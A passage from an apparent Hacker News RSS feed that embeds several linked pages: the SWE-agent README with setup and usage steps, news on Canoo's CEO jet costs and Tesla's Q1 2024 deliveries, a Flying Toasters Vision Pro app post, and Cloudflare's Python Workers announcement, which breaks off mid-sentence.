Renderer library, enabling any 3D app to have a 2D vector backend? Yes it can - I implemented it!</p><p>You can see it working here: <a href="https://vimeo.com/929416955" rel="nofollow">https://vimeo.com/929416955</a> and there’s a deep technical dive here: <a href="https://github.com/renderlet/wander/wiki/Using-renderlet-with-rive%E2%80%90renderer">https://github.com/renderlet/wander/wiki/Using-renderlet-wit...</a>. The code for my runtime Wasm Renderer (a.k.a. Wander) is here: <a href="https://github.com/renderlet/wander">https://github.com/renderlet/wander</a>.</p><p>I’ll come back and do a proper Show HN or Launch HN when the compiler is ready for anyone to use and I have the integration working on all platforms, but I hope this is interesting enough to take a look at now. I want to hear what you think of this!</p></div></td></tr>        <tr></tr><tr><td colspan="2"></td><td><form action="comment" method="post"></form></td></tr>  </tbody></table>
  </td></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Princeton group open sources "SWE-agent", with 12% fix rate for GitHub issues (243 pts)]]></title>
            <link>https://github.com/princeton-nlp/SWE-agent</link>
            <guid>39907468</guid>
            <pubDate>Tue, 02 Apr 2024 16:16:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/princeton-nlp/SWE-agent">https://github.com/princeton-nlp/SWE-agent</a>, See on <a href="https://news.ycombinator.com/item?id=39907468">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto">
  <a href="https://www.swe-agent.com/" rel="nofollow">
    <img src="https://github.com/princeton-nlp/SWE-agent/raw/main/assets/swe-agent-banner.png" alt="swe-agent.com">
  </a>
</p>
<p dir="auto">
  <a href="https://swe-agent.com/" rel="nofollow"><strong>Website &amp; Demo</strong></a>&nbsp; | &nbsp;
  <a href="https://discord.gg/AVEFbBn2rH" rel="nofollow"><strong>Discord</strong></a>&nbsp; | &nbsp;
  <strong>Paper [coming April 10th]</strong>
</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">👋 Overview <a name="user-content-overview"></a></h2><a id="user-content--overview-" aria-label="Permalink: 👋 Overview " href="#-overview-"></a></p>
<p dir="auto">SWE-agent turns LMs (e.g. GPT-4) into software engineering agents that can fix bugs and issues in real GitHub repositories.</p>
<p dir="auto">On the full <a href="https://github.com/princeton-nlp/SWE-bench">SWE-bench</a> test set, SWE-agent resolves <strong>12.29%</strong> of issues, achieving the state-of-the-art performance on the full test set.</p>
<p dir="auto">
  <a target="_blank" rel="noopener noreferrer" href="https://github.com/princeton-nlp/SWE-agent/blob/main/assets/results+preview.png"><img src="https://github.com/princeton-nlp/SWE-agent/raw/main/assets/results+preview.png"></a>
</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">✨ Agent-Computer Interface (ACI) <a name="user-content-aci"></a></h3><a id="user-content--agent-computer-interface-aci-" aria-label="Permalink: ✨ Agent-Computer Interface (ACI) " href="#-agent-computer-interface-aci-"></a></p>
<p dir="auto">We accomplish these results by designing simple LM-centric commands and feedback formats to make it easier for the LM to browse the repository, view, edit and execute code files. We call this an <strong>Agent-Computer Interface</strong> (ACI) and build the SWE-agent repository to make it easy to iterate on ACI design for repository-level coding agents.</p>
<p dir="auto">Just like how typical language models requires good prompt engineering, good ACI design leads to much better results when using agents. As we show in our paper, a baseline agent without a well-tuned ACI does much worse than SWE-agent.</p>
<p dir="auto">SWE-agent contains features that we discovered to be immensly helpful during the agent-computer interface design process:</p>
<ol dir="auto">
<li>We add a linter that runs when an edit command is issued, and do not let the edit command go through if the code isn't syntactically correct.</li>
<li>We supply the agent with a special-built file viewer, instead of having it just <code>cat</code> files. We found that this file viewer works best when displaying just 100 lines in each turn. The file editor that we built has commands for scrolling up and down and for performing a search within the file.</li>
<li>We supply the agent with a special-built full-directory string searching command. We found that it was important for this tool to succintly list the matches- we simply list each file that had at least one match. Showing the model more context about each match proved to be too confusing for the model.</li>
<li>When commands have an empty output we return a message saying "Your command ran successfully and did not produce any output."</li>
</ol>
<p dir="auto">Read our paper for more details.</p>
<div data-snippet-clipboard-copy-content="@misc{yang2024sweagent,
      title={SWE-agent: Agent Computer Interfaces Enable Software Engineering Language Models}, 
      author={John Yang and Carlos E. Jimenez and Alexander Wettig and Shunyu Yao and Karthik Narasimhan and Ofir Press},
      year={2024},
}"><pre><code>@misc{yang2024sweagent,
      title={SWE-agent: Agent Computer Interfaces Enable Software Engineering Language Models}, 
      author={John Yang and Carlos E. Jimenez and Alexander Wettig and Shunyu Yao and Karthik Narasimhan and Ofir Press},
      year={2024},
}
</code></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">🚀 Setup <a name="user-content-setup"></a></h2><a id="user-content--setup-" aria-label="Permalink: 🚀 Setup " href="#-setup-"></a></p>
<ol dir="auto">
<li><a href="https://docs.docker.com/engine/install/" rel="nofollow">Install Docker</a>, then start Docker locally.</li>
<li><a href="https://docs.anaconda.com/free/miniconda/miniconda-install/" rel="nofollow">Install Miniconda</a>, then create the <code>swe-agent</code> environment with <code>conda env create -f environment.yml</code></li>
<li>Activate using <code>conda activate swe-agent</code>.</li>
<li>Run <code>./setup.sh</code> to create the <code>swe-agent</code> docker image.</li>
<li>Create a <code>keys.cfg</code> file at the root of this repository and fill in the following:</li>
</ol>
<div data-snippet-clipboard-copy-content="OPENAI_API_KEY: 'OpenAI API Key Here if using OpenAI Model (optional)'
ANTHROPIC_API_KEY: 'Anthropic API Key Here if using Anthropic Model (optional)'
GITHUB_TOKEN: 'GitHub Token Here (required)'"><pre><code>OPENAI_API_KEY: 'OpenAI API Key Here if using OpenAI Model (optional)'
ANTHROPIC_API_KEY: 'Anthropic API Key Here if using Anthropic Model (optional)'
GITHUB_TOKEN: 'GitHub Token Here (required)'
</code></pre></div>
<p dir="auto">See the following links for tutorials on obtaining <a href="https://docs.anthropic.com/claude/reference/getting-started-with-the-api" rel="nofollow">Anthropic</a>, <a href="https://platform.openai.com/docs/quickstart/step-2-set-up-your-api-key" rel="nofollow">OpenAI</a>, and <a href="https://github.com/princeton-nlp/SWE-agent/blob/main">Github</a> tokens.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">💽 Usage <a name="user-content-usage"></a></h2><a id="user-content--usage-" aria-label="Permalink: 💽 Usage " href="#-usage-"></a></p>
<p dir="auto">There are two steps to the SWE-agent pipeline. First SWE-agent takes an input GitHub issue and returns a pull request that attempts to fix it. We call that step <em>inference</em>. The second step (currently, only available for issues in the SWE-bench benchmark) is to <em>evaluate</em> the pull request to verify that it has indeed fixed the issue.</p>
<p dir="auto"><em>NOTE</em>: At this moment, there are known issues with a small number of repositories that don't install properly for <code>arm64</code> / <code>aarch64</code> architecture computers. We're working on a fix, but if you'd like to run and evaluate on the entirety of SWE-bench, the easiest way is by using an <code>x86</code> machine.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">👩‍💻 Inference <a name="user-content-inference"></a></h3><a id="user-content--inference-" aria-label="Permalink: 👩‍💻 Inference " href="#-inference-"></a></p>
<p dir="auto"><strong>Inference on <em>any</em> GitHub Issue</strong>: Using this script, you can run SWE-agent on any GitHub issue!</p>
<div data-snippet-clipboard-copy-content="python run.py --model_name gpt4 \
  --data_path https://github.com/pvlib/pvlib-python/issues/1603 --config_file config/default_from_url.yaml"><pre><code>python run.py --model_name gpt4 \
  --data_path https://github.com/pvlib/pvlib-python/issues/1603 --config_file config/default_from_url.yaml
</code></pre></div>
<p dir="auto"><strong>Inference on SWE-bench</strong>: Run SWE-agent on <a href="https://www.swebench.com/lite.html" rel="nofollow">SWE-bench Lite</a> and generate patches.</p>
<div data-snippet-clipboard-copy-content="python run.py --model_name gpt4 \
  --per_instance_cost_limit 2.00 \
  --config_file ./config/default.yaml"><pre><code>python run.py --model_name gpt4 \
  --per_instance_cost_limit 2.00 \
  --config_file ./config/default.yaml
</code></pre></div>
<p dir="auto">If you'd like to run on a <em>single</em> issue from SWE-bench, use the <code>--instance_filter</code> option as follows:</p>
<div data-snippet-clipboard-copy-content="python run.py --model_name gpt4 \
  --instance_filter marshmallow-code__marshmallow-1359"><pre><code>python run.py --model_name gpt4 \
  --instance_filter marshmallow-code__marshmallow-1359
</code></pre></div>
<ul dir="auto">
<li>See the <a href="https://github.com/princeton-nlp/SWE-agent/blob/main/scripts"><code>scripts/</code></a> folder for other useful scripts and details.</li>
<li>See the <a href="https://github.com/princeton-nlp/SWE-agent/blob/main/config"><code>config/</code></a> folder for details about how you can define your own configuration!</li>
<li>See the <a href="https://github.com/princeton-nlp/SWE-agent/blob/main/agent"><code>swe-agent/agent/</code></a> folder for details about the logic behind configuration based workflows.</li>
<li>See the <a href="https://github.com/princeton-nlp/SWE-agent/blob/main/swe-agent/environment"><code>swe-agent/environment/</code></a> folder for details about the <code>SWEEnv</code> environment (interface + implementation).</li>
<li>See the <a href="https://github.com/princeton-nlp/SWE-agent/blob/main/trajectories"><code>trajectories/</code></a> folder for details about the output of <code>run.py</code>.</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">🧪 Evaluation <a name="user-content-evaluation"></a></h3><a id="user-content--evaluation-" aria-label="Permalink: 🧪 Evaluation " href="#-evaluation-"></a></p>
<p dir="auto">This step is only available for issues from the SWE-bench set. To evaluate generated pull requests:</p>
<div data-snippet-clipboard-copy-content="cd evaluation/
./run_eval.sh <predictions_path>"><pre><code>cd evaluation/
./run_eval.sh &lt;predictions_path&gt;
</code></pre></div>
<p dir="auto">Replace <code>&lt;predictions_path&gt;</code> with the path to the model's predictions, which should be generated from the <em>Inference</em> step. The <code>&lt;predictions_path&gt;</code> arguments should look like <code>../trajectories/&lt;username&gt;/&lt;model&gt;-&lt;dataset&gt;-&lt;hyperparams&gt;/all_preds.jsonl</code></p>
<ul dir="auto">
<li>See the <a href="https://github.com/princeton-nlp/SWE-agent/blob/main/evaluation"><code>evaluation/</code></a> folder for details about how evaluation works.</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">💫 Contributions <a name="user-content-contributions"></a></h2><a id="user-content--contributions-" aria-label="Permalink: 💫 Contributions " href="#-contributions-"></a></p>
<ul dir="auto">
<li>If you'd like to ask questions, learn about upcoming features, and participate in future development, join our <a href="https://discord.gg/AVEFbBn2rH" rel="nofollow">Discord community</a>!</li>
<li>If you'd like to contribute to the codebase, we welcome <a href="https://github.com/princeton-nlp/SWE-agent/issues">issues</a> and <a href="https://github.com/princeton-nlp/SWE-agent/pulls">pull requests</a>!</li>
<li>If you'd like to see a post or tutorial about some topic, please let us know via an <a href="https://github.com/princeton-nlp/SWE-agent/issues">issue</a>.</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">🪪 License <a name="user-content-license"></a></h2><a id="user-content--license-" aria-label="Permalink: 🪪 License " href="#-license-"></a></p>
<p dir="auto">MIT. Check <code>LICENSE</code>.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Canoo spent double its annual revenue on the CEO's private jet (281 pts)]]></title>
            <link>https://techcrunch.com/2024/04/01/canoo-spent-double-its-annual-revenue-on-the-ceos-private-jet-in-2023/</link>
            <guid>39906924</guid>
            <pubDate>Tue, 02 Apr 2024 15:33:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://techcrunch.com/2024/04/01/canoo-spent-double-its-annual-revenue-on-the-ceos-private-jet-in-2023/">https://techcrunch.com/2024/04/01/canoo-spent-double-its-annual-revenue-on-the-ceos-private-jet-in-2023/</a>, See on <a href="https://news.ycombinator.com/item?id=39906924">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
				<p id="speakable-summary">Tucked inside Canoo’s 2023 earnings report is a nugget regarding the use of CEO Tony Aquila’s private jet — just one of many expenses that<span> illustrates the gap between spending and revenue at the EV startup.</span></p>
<p>Canoo posted Monday its fourth-quarter and full-year earnings for 2023 in a <a href="https://ir.stockpr.com/canoo/sec-filings-email/content/0001628280-24-014075/goev-20231231.htm#i5cf4fcff5f5a4438b15ae9a52ca671ee_112" target="_blank" rel="noopener">regulatory filing</a> that shows a company burning through cash as it tries to scale up volume production of its commercial electric vehicles and avoid the same fate as other EV startups, like recently bankrupt <a href="https://techcrunch.com/tag/arrival/">Arrival</a>. The regulatory filing once again contained a “going concern” warning — which has <a href="https://techcrunch.com/2022/05/10/canoo-warns-it-may-not-have-enough-funds-to-bring-evs-to-market/" target="_blank" rel="noopener">persisted since 2022</a> — as well as some progress on the expenses and revenue fronts.</p>
<p><span>The company generated $886,000 in revenue in 2023 compared to zero dollars in 2022, as the company delivered 22 vehicles to entities like NASA and the state of Oklahoma. And it did reduce its loss from operations by nearly half, from $506 million in 2022 to $267 million in 2023. </span><span>The revenue-to-losses gap is still considerable though: The company reported total net losses of $302.6 million in 2023.&nbsp;</span></p>
<p>Still, one only needs to look at what Canoo is paying to rent the CEO’s private jet to put those “wins” into perspective. Under a deal reached in November 2020, Canoo reimburses Aquila Family Ventures, an entity owned by the CEO, for use of an aircraft. In 2023, Canoo spent $1.7 million on this reimbursement — that’s double the amount of revenue it generated. Canoo paid Aquila Family Ventures $1.3 million in 2022 and $1.8 million in 2021 for use of the aircraft.</p>
<p>Separately, Canoo also paid Aquila Family Ventures $1.7 million in 2023, $1.1 million in 2022 and $500,000 in 2021 for shared services support in its Justin, Texas, corporate office facility, according to regulatory filings.</p>
<p>This could be chalked up to small monetary potatoes&nbsp;if&nbsp;Canoo reaches its revenue forecast for 2024 of $50 million to $100 million.</p>
<p>We’ve asked Canoo for comment and will update this post if we hear back.</p>
			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Recreating the Flying Toasters screen saver for the Vision Pro (131 pts)]]></title>
            <link>https://abhipray.com/posts/flying_toasters/</link>
            <guid>39906887</guid>
            <pubDate>Tue, 02 Apr 2024 15:31:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://abhipray.com/posts/flying_toasters/">https://abhipray.com/posts/flying_toasters/</a>, See on <a href="https://news.ycombinator.com/item?id=39906887">Hacker News</a></p>
<div id="readability-page-1" class="page"><section><article><header><div><p><span>
<time datetime="2024-04-01T00:00:00Z">April 1, 2024</time></span>
<span>
4-minute read</span></p></div></header><div><p>I recently decided to make an app for the Apple Vision Pro (AVP) during a two-week break between jobs. I wanted to explore its potential and learn some new skills. My day job primarily involves low-level firmware; I hadn’t built a user-facing app in a while–my last iOS app experience was back in high school in 2011! This was a chance to see how app development has evolved in 2024, especially with modern code generation tools.</p><h2 id="inspiration-and-the-screensaver-idea">Inspiration and the “Screensaver” Idea
<a href="#inspiration-and-the-screensaver-idea">
<span>Link to heading</span></a></h2><p>After brainstorming with friends, one suggested I look into the classic “Flying Toasters” screensaver by After Dark (released in 1989). I watched a video of it and thought it would be a perfect starter project!</p><p><iframe src="https://www.youtube.com/embed/Ft5DIBAvXIU" allowfullscreen="" title="YouTube Video"></iframe></p><p>I was especially excited to bring the concept of a “screensaver” to this new platform. Historically, screensavers served a practical purpose on CRT monitors—preventing screen burn-ins. From Wikipedia:</p><blockquote><p>Screen burn-in, image burn-in, ghost image, or shadow image, is a permanent discoloration of areas on an electronic display such as a cathode ray tube (CRT) in an old computer monitor or television set. It is caused by cumulative non-uniform use of the screen.
One way to combat screen burn-in was the use of screensavers, which would move an image around to ensure that no one area of the screen remained illuminated for too long.</p></blockquote><p>Today, screensavers primarily serve aesthetic and entertainment purposes, activating during periods of user inactivity. My aim was to incorporate a similar, inactivity-based trigger for the AVP screensaver. Initially, my plan was to employ gaze tracking to identify moments when a user might be “zoned out”. Due to privacy considerations, Apple restricts access to such sensor data. As a workaround, users can signal their activity by periodically tapping a button within the app’s main control window, effectively resetting the inactivity timer. The app also allows users the flexibility to customize the timeout duration, transforming the screensaver into a gentle nudge to take breaks from using the AVP.</p><h2 id="the-screensaver-itself">The Screensaver Itself
<a href="#the-screensaver-itself">
<span>Link to heading</span></a></h2><p>The screensaver features flying toasters soaring across your real-world environment. They emerge from a portal showing the sun and disappear into a portal showing the moon. It was fun adding silly little features like:</p><ul><li>Gesture controls: Scale and rotate the portals to your liking.</li><li>Toaster interaction: Tap a toaster to trigger a whimsical phrase. Baby toasters occasionally make an appearance too!</li><li>Customization: Adjust toaster count, toastiness level, colors, and music. Or, activate “ghost mode” to prevent collisions if the on-screen chaos gets overwhelming.</li></ul><p>Check out the app previews and screenshots on the app store to get a visual: <a href="https://apps.apple.com/us/app/flying-toasters/id6479964879" target="_blank" rel="noopener">https://apps.apple.com/us/app/flying-toasters/id6479964879</a></p><h2 id="technical-challenges">Technical Challenges
<a href="#technical-challenges">
<span>Link to heading</span></a></h2><p>Here are some specific challenges I overcame during the development process:</p><ul><li><p>Learning Swift: Although I’d used Objective-C for an iOS app back in high school, I wanted to learn Apple’s recommended way of writing apps. I spent time reading <a href="https://carlosicaza.com/swiftbooks/SwiftLanguage.pdf" target="_blank" rel="noopener">Swift tutorials</a> and practicing in <a href="https://developer.apple.com/swift-playgrounds/" target="_blank" rel="noopener">Swift Playgrounds</a>. ChatGPT and Gemini were also great resources for code editing and debugging.</p></li><li><p>3D Animation/Art: I had no prior experience with 3D animation. I started with a 3D-printable toaster model and followed <a href="https://www.youtube.com/watch?v=VuMu4tAzFjw" target="_blank" rel="noopener">tutorials</a> to animate the wings. Creating those toasts was trickier! I couldn’t find the right textures for different toastiness levels – after a lot of trial and error (and a hundred attempts with Photoshop’s generative fill), I finally got those realistic-looking textures.</p></li><li><p>Portal Gestures: Apple’s <a href="https://developer.apple.com/documentation/realitykit/transforming-realitykit-entities-with-gestures?changes=_8" target="_blank" rel="noopener">example code</a> was key for implementing intuitive scaling and rotation gestures for the portals.</p></li><li><p>Toaster Physics vs. Animation: I found out the hard way that RealityKit’s physics engine and strict animation paths (using FromToByAnimation()) don’t always play nicely together. My chaotic collision solution? Random launch points with a minimum distance constraint, random <a href="https://cubic-bezier.com/" target="_blank" rel="noopener">cubic-bezier</a> curve paths, and plenty of linear/angular damping on those toasters. If the toasters’ movements are still subjectively chaotic, the user can opt out of collisions by turning on ghost mode.</p></li><li><p>Head Tracking: I wanted the toasters’ whimsical phrases to appear in speech bubbles that always faced the user. RealityKit doesn’t directly track head position, but I adapted a clever <a href="https://stackoverflow.com/questions/77577395/how-to-know-users-position-in-surrounding-space-in-visionos/77616297#77616297" target="_blank" rel="noopener">ARKit workaround</a> to achieve this.</p></li></ul><h2 id="the-future">The future
<a href="#the-future">
<span>Link to heading</span></a></h2><p>This project was a blast! If you have an AVP and end up seeing the flying toasters in action, please let me know what you think! Just as the original Flying Toasters screensaver evolved over a decade (see <a href="https://www.youtube.com/watch?v=Ft5DIBAvXIU&amp;list=PLxRwNKfqQOI1_pp6Cp4p1MnpCsoqCx2cK&amp;index=2" target="_blank" rel="noopener">the YouTube playlist here</a>), I anticipate if there is enough interest and feedback, I will improve the experience. So do share feedback!</p></div></article>
</section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Tesla releases Q1 2024 deliveries: disastrous results (145 pts)]]></title>
            <link>https://electrek.co/2024/04/02/tesla-releases-q1-2024-deliveries-disastrous-results/</link>
            <guid>39906147</guid>
            <pubDate>Tue, 02 Apr 2024 14:29:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://electrek.co/2024/04/02/tesla-releases-q1-2024-deliveries-disastrous-results/">https://electrek.co/2024/04/02/tesla-releases-q1-2024-deliveries-disastrous-results/</a>, See on <a href="https://news.ycombinator.com/item?id=39906147">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
					
<figure>
	<img width="1600" height="818" src="https://electrek.co/wp-content/uploads/sites/3/2021/12/Tesla-all-casrs-hero.jpg?quality=82&amp;strip=all&amp;w=1600" alt="Tesla all cars hero" srcset="https://i0.wp.com/electrek.co/wp-content/uploads/sites/3/2021/12/Tesla-all-casrs-hero.jpg?w=320&amp;quality=82&amp;strip=all&amp;ssl=1 320w, https://i0.wp.com/electrek.co/wp-content/uploads/sites/3/2021/12/Tesla-all-casrs-hero.jpg?w=640&amp;quality=82&amp;strip=all&amp;ssl=1 640w, https://i0.wp.com/electrek.co/wp-content/uploads/sites/3/2021/12/Tesla-all-casrs-hero.jpg?w=1024&amp;quality=82&amp;strip=all&amp;ssl=1 1024w, https://i0.wp.com/electrek.co/wp-content/uploads/sites/3/2021/12/Tesla-all-casrs-hero.jpg?w=1500&amp;quality=82&amp;strip=all&amp;ssl=1 1500w" decoding="async" fetchpriority="high"></figure>

<p>Tesla has released its Q1 2024 delivery and production numbers: confirming the suspicion that it is not growing anymore.</p>



<p>It’s even worse than most people anticipated.</p>



<h2 id="h-tesla-q1-2024-expectations">Tesla Q1 2024 Expectations</h2>



<p>As we have been reporting in the last few weeks,<a href="https://electrek.co/2024/03/28/tesla-tsla-delivery-estimates-all-over-the-place/" target="_blank" rel="noreferrer noopener"> the expectations for Tesla’s Q1 2024 deliveries are all over the place</a>.</p>



<p>Last month, the Wall Street consensus was around 470,000 deliveries, but it has been consistently revised down over the last few weeks as many of them now expect quite a disastrous quarter compared to the previous one.</p>



<p>As of today, the consensus is 431,000 deliveries.</p>



<p>In comparison, Tesla had record deliveries of 484,507 vehicles last quarter for a 20% year-over-year growth rate, and it delivered 422,875 in Q1 2023.</p>



<p>431,000 deliveries would still be a small growth year-over-ear, but it would be a massive quarter-to-quarter drop.</p>



<h2 id="h-tesla-q1-2024-delivery-and-production-results">Tesla Q1 2024 Delivery and Production Results</h2>



<p>Today, Tesla released its official Q1 2024 delivery and production results – confirming 386,810 deliveries for the first quarter of the year.</p>



<figure><table><tbody><tr><td>&nbsp;</td><td><strong>Production</strong></td><td><strong>Deliveries</strong></td><td><strong>Subject to operating lease accounting</strong></td></tr><tr><td>Model 3/Y</td><td>412,376</td><td>369,783</td><td>2%</td></tr><tr><td>Other Models</td><td>20,995</td><td>17,027</td><td>1%</td></tr><tr><td><strong>Total</strong></td><td>433,371</td><td>386,810</td><td><strong>2%</strong></td></tr></tbody></table></figure>



<p>Tesla listed several excuses for the big delivery miss:</p>



<blockquote>
<p>Decline in volumes was partially due to the early phase of the production ramp of the updated Model 3 at our Fremont factory and factory shutdowns resulting from shipping diversions caused by the Red Sea conflict and an arson attack at Gigafactory Berlin.</p>
</blockquote>




	<p>Tesla’s stock dropped by as much as 7% in pre-market trading following the release.</p>



<h2 id="h-electrek-s-take">Electrek’s Take</h2>



<p>This is next-level bad. Even the most pessimistic analysts didn’t come close to predicting this level of deliveries.</p>



<p>All these excuses that Tesla is listing are good excuses, but they are good for the lower production levels. They don’t explain the ~50,000-vehicle discrepancy between production and deliveries. That’s a demand problem. As clear as it gets.</p>



<p>I think this should be a wake-up call. This is Tesla going back about two years in terms of demand.</p>
	<p>
		<a target="_blank" rel="nofollow" href="https://news.google.com/publications/CAAqBwgKMKqD-Qow6c_gAg?hl=en-US&amp;gl=US&amp;ceid=US:en">
			<em>Add Electrek to your Google News feed.</em>&nbsp;
					</a>
	</p>
	<div><p><em>FTC: We use income earning auto affiliate links.</em> <a href="https://electrek.co/about/#affiliate">More.</a></p><p><a href="https://bit.ly/3J2J0VP"><img src="https://electrek.co/wp-content/uploads/sites/3/2024/04/Electrek-banner-750x150-B-1.jpg?quality=82&amp;strip=all" alt="" width="750" height="150"></a></p></div>				</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Python Cloudflare Workers (349 pts)]]></title>
            <link>https://blog.cloudflare.com/python-workers</link>
            <guid>39905441</guid>
            <pubDate>Tue, 02 Apr 2024 13:20:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.cloudflare.com/python-workers">https://blog.cloudflare.com/python-workers</a>, See on <a href="https://news.ycombinator.com/item?id=39905441">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post"><article><p>04/02/2024</p><section><p>16 min read</p><div><figure><img src="https://blog.cloudflare.com/content/images/2024/04/pythonweba.png" alt="" loading="lazy" width="1600" height="900"></figure><p>Starting today, in open beta, you can now <a href="https://developers.cloudflare.com/workers/languages/python/">write Cloudflare Workers in Python</a>.</p><p>This new support for Python is different from how Workers have historically supported languages beyond JavaScript — in this case, we have directly integrated a Python implementation into <a href="https://github.com/cloudflare/workerd">workerd</a>, the open-source Workers runtime. All <a href="https://developers.cloudflare.com/workers/configuration/bindings/">bindings</a>, including bindings to <a href="https://developers.cloudflare.com/vectorize/">Vectorize</a>, <a href="https://developers.cloudflare.com/workers-ai/">Workers AI</a>, <a href="https://developers.cloudflare.com/r2/">R2</a>, <a href="https://developers.cloudflare.com/durable-objects/">Durable Objects</a>, and more are supported on day one. Python Workers can import a subset of popular Python <a href="https://developers.cloudflare.com/workers/languages/python/packages/">packages</a> including <a href="https://fastapi.tiangolo.com/">FastAPI</a>, <a href="https://python.langchain.com/docs/get_started/introduction">Langchain</a>, <a href="https://numpy.org/">Numpy</a> and more. There are no extra build steps or external toolchains.</p><p>To do this, we’ve had to push the bounds of all of our systems, from the runtime itself, to our deployment system, to the contents of the Worker bundle that is published across our <a href="https://www.cloudflare.com/network/">network</a>. You can <a href="https://developers.cloudflare.com/workers/languages/python/">read the docs</a>, and start using it today.</p><p>We want to use this post to pull back the curtain on the internal lifecycle of a Python Worker, share what we’ve learned in the process, and highlight where we’re going next.</p><h2 id="beyond-%E2%80%9Cjust-compile-to-webassembly%E2%80%9D">Beyond “Just compile to WebAssembly”</h2><p>Cloudflare Workers have supported WebAssembly <a href="https://blog.cloudflare.com/webassembly-on-cloudflare-workers">since 2018</a> — each Worker is a <a href="https://developers.cloudflare.com/workers/reference/how-workers-works/">V8 isolate</a>, powered by the same JavaScript engine as the Chrome web browser. In principle, it’s been <a href="https://blog.cloudflare.com/webassembly-on-cloudflare-workers">possible</a> for years to write Workers in any language — including Python — so long as it first compiles to WebAssembly or to JavaScript.</p><p>In practice, just because something is possible doesn’t mean it’s simple. And just because “hello world” works doesn’t mean you can reliably build an application. Building full applications requires supporting an ecosystem of packages that developers are used to building with. For a platform to truly support a programming language, it’s necessary to go much further than showing how to compile code using external toolchains.</p><p>Python Workers are different from what we’ve done in the past. It’s early, and still in beta, but we think it shows what providing first-class support for programming languages beyond JavaScript can look like on Workers.</p><h2 id="the-lifecycle-of-a-python-worker">The lifecycle of a Python Worker</h2><p>With Pyodide now <a href="https://github.com/cloudflare/workerd/tree/main/src/pyodide">built into workerd</a>, you can write a Worker like this:</p><pre><code>from js import Response

async def on_fetch(request, env):
    return Response.new("Hello world!")</code></pre><p>...with a wrangler.toml file that points to a .py file:</p><pre><code>name = "hello-world-python-worker"
main = "src/entry.py"
compatibility_date = "2024-03-18"
compatibility_flags = ["python_workers"]</code></pre><p>…and when you run <a href="https://developers.cloudflare.com/workers/wrangler/commands/#dev">npx wrangler@latest dev</a>, the Workers runtime will:</p><ol><li>Determine which <a href="https://developers.cloudflare.com/workers/languages/python/packages/">version of Pyodide</a> is required, based on your <a href="https://developers.cloudflare.com/workers/configuration/compatibility-dates/">compatibility date</a></li><li>Create an isolate for your Worker, and automatically inject Pyodide</li><li>Serve your Python code using Pyodide</li></ol><p>This all happens under the hood — no extra toolchain or precompilation steps needed. The Python execution environment is provided for you, mirroring how Workers written in JavaScript already work. </p><h2 id="a-python-interpreter-built-into-the-workers-runtime">A Python interpreter built into the Workers runtime</h2><p>Just as JavaScript has <a href="https://en.wikipedia.org/wiki/List_of_ECMAScript_engines">many engines</a>, Python has <a href="https://wiki.python.org/moin/PythonImplementations">many implementations</a> that can execute Python code. <a href="https://github.com/python/cpython">CPython</a> is the reference implementation of Python. If you’ve used Python before, this is almost certainly what you’ve used, and is commonly referred to as just “Python”.</p><p><a href="https://pyodide.org/en/stable/">Pyodide</a> is a port of CPython to WebAssembly. It interprets Python code, without any need to precompile the Python code itself to any other format. It runs in a web browser — check out this <a href="https://pyodide-console.pages.dev/">REPL</a>. It is true to the CPython that Python developers know and expect, providing <a href="https://ggu-python.cloudflare-docs-7ou.pages.dev/workers/languages/python/stdlib">most of the Python Standard Library</a>. It provides a foreign function interface (FFI) to JavaScript, allowing you to call JavaScript APIs directly from Python — more on this below. It provides popular open-source <a href="https://developers.cloudflare.com/workers/languages/python/packages/">packages</a>, and can import pure Python packages directly from PyPI.</p><p>Pyodide struck us as the perfect fit for Workers. It is designed to allow the core interpreter and each native Python module to be built as separate WebAssembly modules, dynamically linked at runtime. This allows the code footprint for these modules to be shared among all Workers running on the same machine, rather than requiring each Worker to bring its own copy. This is essential to making WebAssembly work well in the Workers environment, where we often run <a href="https://www.infoq.com/presentations/cloudflare-v8/">thousands of Workers per machine</a> — we need Workers using the same programming language to share their runtime code footprint. Running thousands of Workers on every machine is what makes it possible for us to deploy every application in every location at a <a href="https://blog.cloudflare.com/workers-pricing-scale-to-zero">reasonable price</a>.</p><p>Just like with JavaScript Workers, with Python Workers we provide the runtime for you:</p><figure><img src="https://blog.cloudflare.com/content/images/2024/04/VMs--Containers--ans-Isolates-comparison.png" alt="" loading="lazy" width="1600" height="798"></figure><p>Pyodide is currently the exception — most languages that target WebAssembly do not yet support dynamic linking, so each application ends up bringing its own copy of its language runtime. We hope to see more languages support dynamic linking in the future, so that we can more effectively bring them to Workers.</p><h3 id="how-pyodide-works">How Pyodide works</h3><p>Pyodide executes Python code in WebAssembly, which is a sandboxed environment, separated from the host runtime. Unlike running native code, all operations outside of pure computation (such as file reads) must be provided by a runtime environment, then <em>imported</em> by the WebAssembly module. </p><p><a href="https://llvm.org/">LLVM</a> provides three target triples for WebAssembly:</p><ol><li><strong>wasm32-unknown-unknown</strong> – this backend provides no C standard library or system call interface; to support this backend, we would need to manually rewrite every system or library call to make use of imports we would define ourselves in the runtime.</li><li><strong>wasm32-wasi</strong> – WASI is a standardized system interface, and defines a standard set of imports that are implemented in WASI runtimes such as <a href="https://github.com/bytecodealliance/wasmtime/">wasmtime</a>.</li><li><strong>wasm32-unknown-emscripten</strong> – Like WASI, Emscripten defines the imports that a WebAssembly program needs to execute, but also outputs an 